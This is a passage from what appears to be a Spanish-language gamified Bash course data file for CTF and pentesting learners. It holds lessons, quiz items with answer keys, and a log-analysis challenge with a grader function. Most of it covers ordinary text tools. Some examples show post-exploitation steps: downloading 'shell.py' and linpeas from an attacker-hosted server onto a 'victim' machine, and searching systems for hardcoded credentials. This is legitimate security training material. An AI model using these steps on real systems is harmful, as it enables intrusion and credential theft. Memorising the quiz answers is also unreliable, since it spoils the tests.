          pregunta: "¿Qué opción de grep hace la búsqueda RECURSIVA en un directorio?",
          opciones: ["-n", "-v", "-r", "-c"],
          correcta: 2,
          explicacion: "grep -r busca recursivamente en todos los archivos de un directorio y sus subdirectorios. grep -ri 'password' /etc/ 2>/dev/null busca la palabra 'password' en todos los archivos de /etc ignorando mayúsculas. Esencial para encontrar credenciales en CTFs."
        },
        {
          id: "bash-3-3",
          titulo: "sort y uniq — Ordenar y deduplicar",
          teoria: "sort ordena líneas y uniq elimina duplicados consecutivos.\n\n• sort archivo → orden alfabético\n• sort -n archivo → orden numérico\n• sort -r archivo → orden inverso\n• sort -u archivo → ordena y elimina duplicados\n• sort -t: -k3 -n archivo → ordena por columna (separador :, columna 3)\n\n• uniq archivo → elimina duplicados consecutivos\n• uniq -c archivo → cuenta ocurrencias\n• sort | uniq → el combo más usado",
          ejemplo: {
            codigo: "# Ordenar y contar IPs únicas en logs:\n$ cat access.log | awk '{print $1}' | sort | uniq -c | sort -rn\n    150 10.10.10.1\n     45 192.168.1.1\n     12 172.16.0.1\n\n# Usuarios únicos en /etc/passwd:\n$ cut -d: -f1 /etc/passwd | sort\nadm\nbash\nroot\nwaldo\n\n# Palabras más frecuentes:\n$ cat texto.txt | tr ' ' '\\n' | sort | uniq -c | sort -rn | head -5",
            output: "    150 10.10.10.1\n     45 192.168.1.1\n     12 172.16.0.1\nadm\nbash\nroot\nwaldo"
          },
          pregunta: "¿Qué hace el combo sort | uniq -c | sort -rn?",
          opciones: [
            "Ordena alfabéticamente y elimina duplicados",
            "Ordena, cuenta ocurrencias de cada línea, y ordena de mayor a menor",
            "Solo elimina líneas duplicadas",
            "Cuenta el número total de líneas"
          ],
          correcta: 1,
          explicacion: "sort | uniq -c | sort -rn es uno de los combos más usados en análisis de logs: sort agrupa duplicados juntos, uniq -c cuenta cuántas veces aparece cada línea, sort -rn ordena de mayor a menor. Perfecto para encontrar IPs más activas, comandos más usados, etc."
        },
        {
          id: "bash-3-4",
          titulo: "cut — Extraer columnas",
          teoria: "cut extrae partes de cada línea de texto.\n\nOpciones:\n• cut -d: -f1 → usa : como delimitador, extrae campo 1\n• cut -d, -f2,3 → delimitador coma, campos 2 y 3\n• cut -c1-10 → caracteres del 1 al 10\n• cut -d' ' -f1 → primer campo separado por espacio\n\nMuy útil para procesar archivos con formato fijo como /etc/passwd, CSV, logs de nmap.",
          ejemplo: {
            codigo: "# Extraer solo nombres de usuario de /etc/passwd:\n$ cut -d: -f1 /etc/passwd\nroot\ndaemon\nwaldo\n\n# Extraer usuario y shell (campos 1 y 7):\n$ cut -d: -f1,7 /etc/passwd\nroot:/bin/bash\ndaemon:/usr/sbin/nologin\nwaldo:/bin/bash\n\n# Primeros 15 caracteres de cada línea:\n$ cut -c1-15 /var/log/auth.log\nJun  1 10:00:01",
            output: "root\ndaemon\nwaldo\nroot:/bin/bash\ndaemon:/usr/sbin/nologin\nwaldo:/bin/bash\nJun  1 10:00:01"
          },
          pregunta: "¿Qué hace cut -d: -f1 /etc/passwd?",
          opciones: [
            "Extrae el campo 1 usando : como delimitador (los nombres de usuario)",
            "Cuenta los campos separados por :",
            "Elimina las líneas que contienen :",
            "Reemplaza : con el campo 1"
          ],
          correcta: 0,
          explicacion: "cut -d: -f1 usa : como delimitador (-d:) y extrae el primer campo (-f1). En /etc/passwd el primer campo separado por : es el nombre de usuario. Es equivalente a awk -F: '{print $1}' pero más simple."
        },
        {
          id: "bash-3-5",
          titulo: "wc — Contar",
          teoria: "wc (word count) cuenta líneas, palabras y caracteres.\n\n• wc -l archivo → cuenta líneas\n• wc -w archivo → cuenta palabras\n• wc -c archivo → cuenta bytes/caracteres\n• wc → muestra los tres valores\n\nUso típico en pipelines:\n• cat archivo | wc -l → cuántas líneas\n• grep 'Failed' auth.log | wc -l → cuántos intentos fallidos",
          ejemplo: {
            codigo: "$ wc /etc/passwd\n  45  90 2847 /etc/passwd\n#líneas palabras bytes\n\n# Contar usuarios con bash:\n$ grep '/bin/bash' /etc/passwd | wc -l\n2\n\n# Contar intentos de login fallidos:\n$ grep 'Failed password' /var/log/auth.log | wc -l\n847\n\n# Cuántos archivos hay en /etc:\n$ ls /etc | wc -l\n187",
            output: "  45  90 2847 /etc/passwd\n2\n847\n187"
          },
          pregunta: "¿Qué opción de wc cuenta el número de LÍNEAS de un archivo?",
          opciones: ["-w", "-c", "-l", "-n"],
          correcta: 2,
          explicacion: "wc -l cuenta las líneas. En CTFs y pentesting usarás mucho: grep 'patrón' archivo | wc -l para saber cuántas coincidencias hay. Por ejemplo: grep 'Failed' /var/log/auth.log | wc -l te dice cuántos intentos de login fallidos hubo."
        },
        {
          id: "bash-3-6",
          titulo: "awk — Procesador de texto poderoso",
          teoria: "awk es un lenguaje de procesamiento de texto. Trabaja fila por fila y te permite seleccionar campos, hacer cálculos y aplicar condiciones.\n\nSintaxis básica: awk '{acción}' archivo\n\n• $1, $2, $NF → campos (NF es el último)\n• -F: → cambiar delimitador\n• NR → número de línea actual\n• /patrón/ → filtrar líneas\n\nawk es más poderoso que cut porque puede hacer operaciones con los datos.",
          ejemplo: {
            codigo: "# Extraer solo los nombres de usuario:\n$ awk -F: '{print $1}' /etc/passwd\nroot\nwaldo\n\n# Imprimir campo 1 y 3 (usuario y UID):\n$ awk -F: '{print $1, $3}' /etc/passwd\nroot 0\nwaldo 1000\n\n# Solo usuarios con UID > 999:\n$ awk -F: '$3 > 999 {print $1, $3}' /etc/passwd\nwaldo 1000\n\n# Sumar una columna:\n$ awk '{sum += $5} END {print sum}' archivo",
            output: "root\nwaldo\nroot 0\nwaldo 1000\nwaldo 1000"
          },
          pregunta: "¿Qué hace awk -F: '{print $1, $3}' /etc/passwd?",
          opciones: [
            "Imprime todos los campos separados por :",
            "Imprime el campo 1 y el campo 3 usando : como separador",
            "Cuenta los campos que tienen :",
            "Filtra líneas que contienen : en el campo 3"
          ],
          correcta: 1,
          explicacion: "-F: establece : como separador de campos. $1 es el primer campo (usuario) y $3 es el tercero (UID). awk permite imprimir cualquier combinación de campos de forma flexible. Es más poderoso que cut porque puede hacer condiciones y cálculos."
        },
        {
          id: "bash-3-7",
          titulo: "sed — Editor de flujo",
          teoria: "sed (stream editor) modifica texto línea por línea. Principalmente se usa para buscar y reemplazar.\n\nUso más común:\n• sed 's/viejo/nuevo/' → reemplaza primera ocurrencia por línea\n• sed 's/viejo/nuevo/g' → reemplaza todas las ocurrencias\n• sed -i 's/viejo/nuevo/g' archivo → modifica el archivo directamente\n• sed '/patrón/d' → elimina líneas con el patrón\n• sed -n '5,10p' → imprime líneas 5 a 10",
          ejemplo: {
            codigo: "# Reemplazar texto:\n$ echo 'Hola mundo' | sed 's/mundo/HACKFORGE/'\nHola HACKFORGE\n\n# Eliminar comentarios de un archivo:\n$ sed '/^#/d' /etc/ssh/sshd_config\n\n# Reemplazar IP en archivo de configuración:\n$ sed -i 's/127.0.0.1/10.10.10.1/g' config.txt\n\n# Extraer líneas 10-20 de un log:\n$ sed -n '10,20p' /var/log/syslog\n\n# Eliminar líneas vacías:\n$ sed '/^$/d' archivo.txt",
            output: "Hola HACKFORGE\nPort 22\nLoginGraceTime 2m\nPermitRootLogin prohibit-password"
          },
          pregunta: "¿Qué hace sed 's/password/*****/g' archivo.txt?",
          opciones: [
            "Busca la palabra 'password' y muestra las líneas que la contienen",
            "Reemplaza TODAS las ocurrencias de 'password' con '*****' en el output",
            "Elimina las líneas que contienen 'password'",
            "Cuenta cuántas veces aparece 'password'"
          ],
          correcta: 1,
          explicacion: "sed 's/viejo/nuevo/g' reemplaza todas las ocurrencias (g=global) de 'viejo' con 'nuevo' en la salida. Sin el -i, no modifica el archivo original. Con -i, sí lo modifica. Útil para sanitizar logs o modificar configuraciones."
        },
        {
          id: "bash-3-8",
          titulo: "tr — Traducir caracteres",
          teoria: "tr (translate) reemplaza o elimina caracteres individuales.\n\n• tr 'abc' 'ABC' → reemplaza a→A, b→B, c→C\n• tr -d 'caracteres' → elimina caracteres\n• tr -s ' ' → comprime espacios múltiples en uno\n• tr '[:lower:]' '[:upper:]' → mayúsculas\n• tr '[:upper:]' '[:lower:]' → minúsculas\n\ntr trabaja con stdin, no con archivos directamente.",
          ejemplo: {
            codigo: "# Convertir a mayúsculas:\n$ echo 'hackforge' | tr '[:lower:]' '[:upper:]'\nHACKFORGE\n\n# Eliminar caracteres específicos:\n$ echo 'H4ck3r!' | tr -d '0-9!'\nHckr\n\n# Reemplazar espacios con newlines:\n$ echo 'uno dos tres' | tr ' ' '\\n'\nuno\ndos\ntres\n\n# Contar palabras de un texto:\n$ cat texto.txt | tr ' ' '\\n' | sort | uniq -c | sort -rn",
            output: "HACKFORGE\nHckr\nuno\ndos\ntres"
          },
          pregunta: "¿Qué hace echo 'Hello' | tr '[:lower:]' '[:upper:]'?",
          opciones: ["hELLO", "hello", "HELLO", "Hello"],
          correcta: 2,
          explicacion: "tr '[:lower:]' '[:upper:]' convierte todas las letras minúsculas a mayúsculas. [:lower:] y [:upper:] son clases de caracteres de POSIX. El resultado es HELLO. También puedes usar tr 'a-z' 'A-Z'."
        },
        {
          id: "bash-3-9",
          titulo: "tee — Bifurcar el flujo",
          teoria: "tee lee stdin y escribe tanto en stdout como en un archivo simultáneamente. Como una T en una tubería.\n\n• cmd | tee archivo → muestra Y guarda\n• cmd | tee -a archivo → muestra Y añade\n• cmd1 | tee archivo | cmd2 → guarda y pasa al siguiente\n\nMuy útil cuando quieres guardar el resultado de nmap y a la vez procesarlo con grep.",
          ejemplo: {
            codigo: "# Ver Y guardar resultado de nmap:\n$ nmap -sV 10.10.10.1 | tee nmap_result.txt\nStarting Nmap...\nPORT   STATE SERVICE VERSION\n22/tcp open  ssh     OpenSSH 7.6\n80/tcp open  http    Apache 2.4.29\n# El resultado aparece en pantalla Y en nmap_result.txt\n\n# Guardar y filtrar al mismo tiempo:\n$ nmap -sV 10.10.10.1 | tee nmap_full.txt | grep 'open'",
            output: "22/tcp open  ssh     OpenSSH 7.6\n80/tcp open  http    Apache 2.4.29"
          },
          pregunta: "¿Cuál es la diferencia principal entre > y tee?",
          opciones: [
            "No hay diferencia",
            "tee muestra en pantalla Y guarda, > solo guarda sin mostrar",
            "> es más rápido que tee",
            "tee solo funciona con nmap"
          ],
          correcta: 1,
          explicacion: "> redirige la salida a un archivo y NO la muestra en pantalla. tee hace ambas cosas: muestra en pantalla (stdout) Y guarda en el archivo. En pentesting usas tee para ver resultados en tiempo real mientras los guardas para análisis posterior."
        },
        {
          id: "bash-3-10",
          titulo: "xargs — Pasar argumentos",
          teoria: "xargs toma la entrada de stdin y la convierte en argumentos de un comando.\n\nMuy útil cuando un comando no acepta pipes directamente.\n\n• cmd | xargs cmd2 → pasa salida como argumentos\n• find . -name '*.txt' | xargs cat → lee todos los .txt\n• find . -name '*.tmp' | xargs rm → borra todos los .tmp\n• cmd | xargs -I {} cmd2 {} → sustituye {} con cada línea",
          ejemplo: {
            codigo: "# Leer todos los archivos .txt:\n$ find . -name '*.txt' | xargs cat\n\n# Buscar 'password' en todos los archivos Python:\n$ find / -name '*.py' 2>/dev/null | xargs grep -l 'password'\n/opt/app/config.py\n/home/waldo/tools/exploit.py\n\n# Eliminar archivos temporales:\n$ find /tmp -name '*.tmp' | xargs rm -f\n\n# Con placeholder {}:\n$ cat ips.txt | xargs -I {} nmap -sV {}",
            output: "/opt/app/config.py\n/home/waldo/tools/exploit.py"
          },
          pregunta: "¿Qué hace find / -name '*.py' | xargs grep -l 'password'?",
          opciones: [
            "Busca archivos Python que se llamen 'password'",
            "Lista todos los archivos .py que contienen la palabra 'password'",
            "Elimina archivos .py que contienen 'password'",
            "Cuenta cuántos archivos .py tienen 'password'"
          ],
          correcta: 1,
          explicacion: "find encuentra todos los archivos .py, xargs los pasa como argumentos a grep -l que imprime solo los nombres de archivos que contienen 'password'. En CTFs y pentesting esto es fundamental para buscar credenciales hardcodeadas en código fuente."
        },
        {
          id: "bash-3-11",
          titulo: "Expresiones regulares básicas",
          teoria: "Las expresiones regulares (regex) son patrones para buscar texto.\n\nCaracteres especiales:\n• . → cualquier carácter\n• * → cero o más del anterior\n• + → uno o más del anterior (con -E)\n• ? → cero o uno del anterior\n• ^ → inicio de línea\n• $ → fin de línea\n• [abc] → uno de estos caracteres\n• [^abc] → ninguno de estos\n• \\d → dígito (con -P)\n• | → alternativa (OR)",
          ejemplo: {
            codigo: "# Líneas que empiezan con root:\n$ grep '^root' /etc/passwd\nroot:x:0:0:root:/root:/bin/bash\n\n# Líneas que terminan con bash:\n$ grep 'bash$' /etc/passwd\nroot:x:0:0:root:/root:/bin/bash\nwaldo:x:1000:1000::/home/waldo:/bin/bash\n\n# Buscar IPs:\n$ grep -E '([0-9]{1,3}\\.){3}[0-9]{1,3}' archivo.txt\n10.10.10.1\n192.168.1.100\n\n# Buscar emails:\n$ grep -E '[a-zA-Z0-9.]+@[a-zA-Z0-9.]+\\.[a-z]+' archivo.txt",
            output: "root:x:0:0:root:/root:/bin/bash\nroot:x:0:0:root:/root:/bin/bash\nwaldo:x:1000:1000::/home/waldo:/bin/bash\n10.10.10.1\n192.168.1.100"
          },
          pregunta: "En regex, ¿qué significa el símbolo ^ al inicio de un patrón?",
          opciones: [
            "Cualquier carácter",
            "Final de línea",
            "Inicio de línea",
            "Negar el patrón"
          ],
          correcta: 2,
          explicacion: "^ al inicio del patrón ancla la búsqueda al inicio de la línea. grep '^root' solo coincide si la línea EMPIEZA con 'root'. $ ancla al final. Dentro de [], ^ tiene otro significado: [^abc] significa 'ninguno de estos caracteres'."
        },
        {
          id: "bash-3-12",
          titulo: "Analizar logs con pipes",
          teoria: "Una de las habilidades más importantes en seguridad es analizar logs.\n\nLogs importantes en Linux:\n• /var/log/auth.log → intentos de autenticación SSH\n• /var/log/apache2/access.log → peticiones web\n• /var/log/syslog → logs generales del sistema\n• /var/log/kern.log → logs del kernel\n\nEl pipeline cat log | grep | sort | uniq | cut es la base del análisis.",
          ejemplo: {
            codigo: "# IPs que más intentaron hacer brute force SSH:\n$ grep 'Failed password' /var/log/auth.log | \\\n  grep -oE '[0-9]{1,3}(\\.[0-9]{1,3}){3}' | \\\n  sort | uniq -c | sort -rn | head -5\n    847 192.168.1.100\n    234 10.0.0.50\n     12 172.16.0.1\n\n# URLs más visitadas en Apache:\n$ awk '{print $7}' /var/log/apache2/access.log | \\\n  sort | uniq -c | sort -rn | head -10",
            output: "    847 192.168.1.100\n    234 10.0.0.50\n     12 172.16.0.1\n    500 /index.php\n    200 /login.php\n    150 /admin/"
          },
          pregunta: "¿Qué archivo de logs registra los intentos de autenticación SSH en Linux?",
          opciones: ["/var/log/ssh.log", "/var/log/auth.log", "/var/log/login.log", "/var/log/syslog"],
          correcta: 1,
          explicacion: "/var/log/auth.log registra todos los eventos de autenticación: logins SSH exitosos, fallidos, uso de sudo, etc. Es el primer lugar donde miras en una investigación de seguridad o CTF de forense. En sistemas Red Hat/CentOS se llama /var/log/secure."
        },
        {
          id: "bash-3-13",
          titulo: "base64 — Codificación",
          teoria: "base64 codifica y decodifica datos en base64. Muy común en CTFs donde las flags o datos están codificados.\n\n• base64 archivo → codifica\n• base64 -d archivo → decodifica\n• echo 'texto' | base64 → codifica texto\n• echo 'Y29kaWZpY2Fkbw==' | base64 -d → decodifica\n\nEn CTFs verás muchas variantes: base32, base58, base85, ROT13, hex...",
          ejemplo: {
            codigo: "# Codificar:\n$ echo 'THM{s3cr3t_flag}' | base64\nVEhNe3MzY3IzdF9mbGFnfQo=\n\n# Decodificar:\n$ echo 'VEhNe3MzY3IzdF9mbGFnfQo=' | base64 -d\nTHM{s3cr3t_flag}\n\n# Decodificar archivo:\n$ base64 -d encoded_flag.txt\nTHM{b4s3_64_fl4g}\n\n# En CTFs también verás hex:\n$ echo '54484d7b666c61677d' | xxd -r -p\nTHM{flag}",
            output: "VEhNe3MzY3IzdF9mbGFnfQo=\nTHM{s3cr3t_flag}\nTHM{b4s3_64_fl4g}\nTHM{flag}"
          },
          pregunta: "Encuentras el texto 'SEFDS0ZPUkdF' en un CTF. ¿Qué comando usas para decodificarlo?",
          opciones: [
            "base64 'SEFDS0ZPUkdF'",
            "echo 'SEFDS0ZPUkdF' | base64 -d",
            "decode base64 'SEFDS0ZPUkdF'",
            "base64 --decode 'SEFDS0ZPUkdF'"
          ],
          correcta: 1,
          explicacion: "echo 'texto' | base64 -d decodifica base64. La opción -d (o --decode) es para decodificar. Sin -d, codifica. En CTFs siempre que veas texto con caracteres A-Z, a-z, 0-9, +, / y terminado en = prueba base64 -d primero."
        },
        {
          id: "bash-3-14",
          titulo: "curl — Hacer peticiones HTTP",
          teoria: "curl hace peticiones HTTP desde la terminal. Fundamental para web hacking.\n\n• curl URL → GET básico\n• curl -v URL → verbose (muestra headers)\n• curl -I URL → solo headers de respuesta\n• curl -X POST -d 'data' URL → POST request\n• curl -b 'cookie=valor' URL → enviar cookie\n• curl -H 'Header: valor' URL → añadir header\n• curl -o archivo URL → guardar respuesta\n• curl -s URL → silencioso (sin progress bar)",
          ejemplo: {
            codigo: "# GET básico:\n$ curl http://10.10.10.1\n<html>...</html>\n\n# Ver headers de respuesta:\n$ curl -I http://10.10.10.1\nHTTP/1.1 200 OK\nServer: Apache/2.4.29\nX-Powered-By: PHP/7.2\n\n# POST con datos:\n$ curl -X POST -d 'user=admin&pass=admin' http://10.10.10.1/login\n\n# Con cookie de sesión:\n$ curl -b 'PHPSESSID=abc123' http://10.10.10.1/admin\n\n# Descargar archivo:\n$ curl -o exploit.py http://10.10.10.1/tools/exploit.py",
            output: "HTTP/1.1 200 OK\nServer: Apache/2.4.29\nX-Powered-By: PHP/7.2"
          },
          pregunta: "¿Qué opción de curl muestra SOLO los headers HTTP de respuesta sin el body?",
          opciones: ["-v", "-H", "-I", "-s"],
          correcta: 2,
          explicacion: "curl -I hace una petición HEAD que solo devuelve los headers HTTP sin el body. Es útil para ver: versión del servidor (Server:), tecnologías usadas (X-Powered-By:), cookies (Set-Cookie:) y redirecciones (Location:). Información valiosa en pentesting web."
        },
        {
          id: "bash-3-15",
          titulo: "wget — Descargar archivos",
          teoria: "wget descarga archivos desde URLs. Similar a curl pero más orientado a descargas.\n\n• wget URL → descarga el archivo\n• wget -O nombre URL → guarda con otro nombre\n• wget -q URL → silencioso\n• wget -r URL → descarga recursiva (mirror de sitio)\n• wget -c URL → continúa descarga interrumpida\n• wget --no-check-certificate URL → ignora SSL\n\nEn CTFs: wget es clave para descargar herramientas a la máquina víctima.",
          ejemplo: {
            codigo: "# Descargar archivo:\n$ wget http://10.10.10.1/exploit.py\n--2024-06-01 10:00:00-- http://10.10.10.1/exploit.py\nSaving to: 'exploit.py'\nexploit.py   100%[=====>] 2.45K\n\n# Descargar con nombre específico:\n$ wget -O linpeas.sh https://github.com/.../linpeas.sh\n\n# Desde la máquina víctima, descargar tu herramienta:\n# (primero inicia un servidor HTTP en tu Kali)\n$ python3 -m http.server 8080\n# Desde la víctima:\n$ wget http://TU_IP:8080/shell.py",
            output: "exploit.py   100%[=====>] 2.45K\nlinpeas.sh   100%[=====>] 145K"
          },
          pregunta: "En un CTF tienes shell en la víctima y quieres descargar linpeas desde tu Kali. ¿Qué haces primero en tu Kali?",
          opciones: [
            "curl -O linpeas.sh",
            "python3 -m http.server 8080",
            "wget http://victim/linpeas.sh",
            "nc -lp 4444 < linpeas.sh"
          ],
          correcta: 1,
          explicacion: "python3 -m http.server 8080 inicia un servidor HTTP simple en tu Kali en el puerto 8080, sirviendo los archivos del directorio actual. Luego desde la víctima: wget http://TU_IP:8080/linpeas.sh. Es la forma más común de transferir herramientas en CTFs."
        },
        {
          id: "bash-3-16",
          titulo: "Procesamiento avanzado con awk",
          teoria: "awk puede hacer mucho más que extraer campos:\n\n• Condiciones: awk '$3 > 1000 {print}'\n• Cálculos: awk '{sum+=$1} END{print sum}'\n• Múltiples delimitadores: awk -F'[,:]'\n• Variables especiales: NR (número de línea), NF (número de campos), FS (separador)\n• BEGIN y END: código antes y después de procesar",
          ejemplo: {
            codigo: "# Usuarios con UID mayor a 999 (usuarios reales):\n$ awk -F: '$3 > 999 {print $1, $3}' /etc/passwd\nwaldo 1000\nhacker 1001\n\n# Sumar bytes de archivos listados por ls:\n$ ls -la | awk 'NR>1 {sum+=$5} END{print \"Total:\", sum, \"bytes\"}'\nTotal: 45678 bytes\n\n# Imprimir solo líneas 5-10:\n$ awk 'NR>=5 && NR<=10' archivo.txt\n\n# Contar campos en cada línea:\n$ awk '{print NF, $0}' /etc/passwd | head -3\n7 root:x:0:0:root:/root:/bin/bash",
            output: "waldo 1000\nhacker 1001\nTotal: 45678 bytes\n7 root:x:0:0:root:/root:/bin/bash"
          },
          pregunta: "¿Qué hace awk '$3 > 999 {print $1}' /etc/passwd?",
          opciones: [
            "Imprime el campo 3 si es mayor a 999",
            "Imprime el campo 1 (usuario) solo si el campo 3 (UID) es mayor a 999",
            "Imprime las líneas donde aparece el número 999",
            "Filtra las primeras 999 líneas"
          ],
          correcta: 1,
          explicacion: "En awk, $3 > 999 es la condición (campo 3, el UID, mayor a 999) y {print $1} es la acción (imprime el campo 1, el nombre de usuario). En Linux, los UIDs de usuarios reales empiezan en 1000. Esto filtra y muestra solo usuarios humanos reales."
        },
        {
          id: "bash-3-17",
          titulo: "diff y comm — Comparar archivos",
          teoria: "Para comparar archivos:\n\n• diff archivo1 archivo2 → muestra diferencias línea por línea\n• diff -u archivo1 archivo2 → formato unificado (más legible)\n• diff -r dir1/ dir2/ → compara directorios\n• comm archivo1 archivo2 → líneas comunes y exclusivas\n• md5sum archivo → hash MD5 del archivo\n• sha256sum archivo → hash SHA256\n\nEn forense: comparar archivos para detectar modificaciones.",
          ejemplo: {
            codigo: "$ diff original.txt modificado.txt\n2c2\n< password=secreto123\n---\n> password=nuevo_pass\n\n# Formato unificado (más legible):\n$ diff -u original.txt modificado.txt\n--- original.txt\n+++ modificado.txt\n@@ -2 +2 @@\n-password=secreto123\n+password=nuevo_pass\n\n# Verificar integridad de archivo:\n$ md5sum exploit.py\nd41d8cd98f00b204e9800998ecf8427e  exploit.py",
            output: "2c2\n< password=secreto123\n---\n> password=nuevo_pass\nd41d8cd98f00b204e9800998ecf8427e  exploit.py"
          },
          pregunta: "¿Para qué se usa md5sum en seguridad?",
          opciones: [
            "Para cifrar archivos",
            "Para verificar la integridad de un archivo (detectar modificaciones)",
            "Para comprimir archivos",
            "Para cambiar permisos"
          ],
          correcta: 1,
          explicacion: "md5sum genera un hash del archivo. Si el archivo cambia aunque sea un bit, el hash es completamente diferente. Se usa para verificar que un archivo no fue modificado (malware, tampering). En CTFs: sha256sum confirma que descargaste el archivo correcto."
        },
        {
          id: "bash-3-18",
          titulo: "One-liners para CTF",
          teoria: "Un one-liner es un comando complejo en una sola línea usando pipes. En CTFs son esenciales para resolver desafíos rápidamente.\n\nEjemplos comunes:\n• Extraer flags de un archivo binario\n• Decodificar múltiples capas de encoding\n• Analizar logs para encontrar credenciales\n• Buscar archivos con contenido específico",
          ejemplo: {
            codigo: "# Extraer todas las flags de un log:\n$ grep -oE 'THM\\{[^}]+\\}' archivo.log\nTHM{s3cr3t_flag}\n\n# Decodificar base64 y buscar flag:\n$ cat encoded.txt | base64 -d | grep 'THM'\n\n# Encontrar credenciales en código Python:\n$ find / -name '*.py' 2>/dev/null | xargs grep -h 'password\\|passwd\\|secret' 2>/dev/null\n\n# IPs únicas en logs de Apache:\n$ awk '{print $1}' access.log | sort -u\n\n# Líneas con errores 500 en Apache:\n$ awk '$9 == 500' access.log | awk '{print $1, $7}'",
            output: "THM{s3cr3t_flag}\nTHM{d3c0d3d_flag}\npassword = 'admin123'\n10.10.10.1\n10.10.10.5\n10.10.10.1 /admin/config.php"
          },
          pregunta: "¿Qué hace grep -oE 'THM\\{[^}]+\\}' archivo.log?",
          opciones: [
            "Busca la palabra THM en el archivo",
            "Extrae exactamente el patrón de flag THM{...} del archivo",
            "Elimina las líneas que contienen flags",
            "Cuenta cuántas flags hay"
          ],
          correcta: 1,
          explicacion: "grep -o imprime solo la parte que coincide (no la línea completa), -E activa regex extendida. THM\\{[^}]+\\} es el patrón: 'THM{' seguido de uno o más caracteres que no sean '}', seguido de '}'. Perfecto para extraer flags en el formato de TryHackMe."
        },
        {
          id: "bash-3-19",
          titulo: "Variables en scripts",
          teoria: "Las variables en Bash scripts son fundamentales:\n\n• VAR=valor → asigna (sin espacios)\n• $VAR o ${VAR} → usa la variable\n• $1, $2, $3 → argumentos del script\n• $0 → nombre del script\n• $# → número de argumentos\n• $@ → todos los argumentos\n• $? → código de salida del último comando (0=éxito)\n• $(comando) → guarda la salida de un comando",
          ejemplo: {
            codigo: "#!/bin/bash\nIP=$1\nPORTOS=$2\n\n# Verificar argumentos:\nif [ $# -lt 1 ]; then\n    echo 'Uso: $0 <IP> [puertos]'\n    exit 1\nfi\n\n# Guardar salida de comando:\nFECHA=$(date +%Y%m%d)\nOUTPUT=\"scan_${IP}_${FECHA}.txt\"\n\necho \"[*] Escaneando $IP...\"\nnmap -sV $IP > $OUTPUT\necho \"[+] Resultado guardado en $OUTPUT\"",
            output: "[*] Escaneando 10.10.10.1...\n[+] Resultado guardado en scan_10.10.10.1_20240601.txt"
          },
          pregunta: "En un script Bash, ¿qué contiene la variable $?",
          opciones: [
            "El nombre del script",
            "Todos los argumentos",
            "El código de salida del último comando ejecutado",
            "El número de argumentos"
          ],
          correcta: 2,
          explicacion: "$? contiene el código de salida del último comando. 0 significa éxito, cualquier otro número es error. Muy útil para verificar si un comando funcionó: nmap ... && echo 'OK' || echo 'Falló'. En scripts de automatización siempre verificas $? para manejar errores."
        },
        {
          id: "bash-3-20",
          titulo: "Resumen Mundo 3",
          teoria: "¡Mundo 3 completado! Ahora puedes procesar datos como un profesional.\n\n✅ Pipe | — conectar comandos\n✅ grep — buscar patrones y regex\n✅ sort/uniq — ordenar y deduplicar\n✅ cut/awk — extraer campos\n✅ sed/tr — transformar texto\n✅ wc — contar\n✅ tee — bifurcar salida\n✅ xargs — pasar argumentos\n✅ base64 — codificar/decodificar\n✅ curl/wget — peticiones HTTP\n✅ Análisis de logs\n✅ One-liners de CTF\n\nEstas habilidades son las que separan a un hacker amateur de uno profesional.",
          ejemplo: {
            codigo: "# One-liner completo de análisis:\n# 'Dado un log de Apache, encuentra las 5 IPs\n#  que más peticiones 404 generaron'\n\n$ awk '$9==404 {print $1}' access.log \\\n  | sort \\\n  | uniq -c \\\n  | sort -rn \\\n  | head -5\n\n    234 10.10.10.5\n     89 192.168.1.200\n     45 172.16.0.10\n     23 10.0.0.50\n     12 192.168.100.1",
            output: "    234 10.10.10.5\n     89 192.168.1.200\n     45 172.16.0.10\n     23 10.0.0.50\n     12 192.168.100.1"
          },
          pregunta: "Combinas awk + sort + uniq -c + sort -rn. ¿Para qué sirve este pipeline?",
          opciones: [
            "Solo para analizar logs de Apache",
            "Para extraer campos, ordenar, contar frecuencias y ordenar por cantidad",
            "Para eliminar líneas duplicadas de cualquier archivo",
            "Solo funciona con archivos de texto plano"
          ],
          correcta: 1,
          explicacion: "Este pipeline es universal: awk extrae el campo de interés, sort agrupa iguales, uniq -c cuenta ocurrencias, sort -rn ordena de mayor a menor. Sirve para cualquier análisis de frecuencia: IPs más activas, usuarios más mencionados, errores más comunes, etc."
        }
      ],
      desafio: {
        titulo: "Desafío Final — Análisis de Log Forense",
        descripcion: "Analiza un log ficticio usando pipelines para extraer información de seguridad.",
        instrucciones: [
          "Crea un archivo 'auth_sim.log' con al menos 5 líneas simulando intentos SSH fallidos con el formato: 'Jun 1 10:00:01 sshd: Failed password for root from 10.10.10.1'",
          "Usa grep para filtrar solo las líneas con 'Failed'",
          "Usa awk o cut para extraer solo las IPs",
          "Usa sort y uniq -c para contar intentos por IP",
          "Usa sort -rn para ordenar de mayor a menor",
          "Guarda el resultado en 'reporte_ataques.txt' usando tee"
        ],
        solucion: `# Crear log simulado
cat > auth_sim.log << 'EOF'
Jun 1 10:00:01 sshd: Failed password for root from 10.10.10.1
Jun 1 10:00:02 sshd: Failed password for admin from 10.10.10.1
Jun 1 10:00:03 sshd: Failed password for root from 192.168.1.5
Jun 1 10:00:04 sshd: Failed password for user from 10.10.10.1
Jun 1 10:00:05 sshd: Accepted password for waldo from 10.0.0.1
EOF

grep 'Failed' auth_sim.log | awk '{print $NF}' | sort | uniq -c | sort -rn | tee reporte_ataques.txt`,
        test: (codigo) => {
          return codigo.includes("grep") &&
                 (codigo.includes("awk") || codigo.includes("cut")) &&
                 codigo.includes("sort") &&
                 codigo.includes("uniq") &&
                 (codigo.includes("tee") || codigo.includes(">"));
        }
      }
    },

    // ─────────────────────────────────────────────
    // MUNDO 4 — RED Y CONECTIVIDAD
    // ─────────────────────────────────────────────
    {
      id: 4,
      nombre: "Red y Conectividad",
      icon: "🌐",
      color: "#38bdf8",
      descripcion: "ping, netstat, ss, curl, ssh, nmap. Domina la red desde la terminal.",
      bloqueado: false,
      niveles: [
        {
          id: "bash-4-1",
          titulo: "ip y ifconfig — Configuración de red",
          teoria: "Para ver y configurar interfaces de red:\n\n• ip a → muestra todas las interfaces y sus IPs\n• ip r → tabla de rutas\n• ifconfig → versión antigua (aún muy usada)\n• ip link → estado de interfaces\n\nEn CTFs: ip a te da tu dirección IP para configurar listeners de reverse shells.\n\nInterfaces comunes:\n• eth0/ens33 → red cableada\n• wlan0 → WiFi\n• tun0 → VPN (TryHackMe/HackTheBox)\n• lo → loopback (127.0.0.1)",
          ejemplo: {
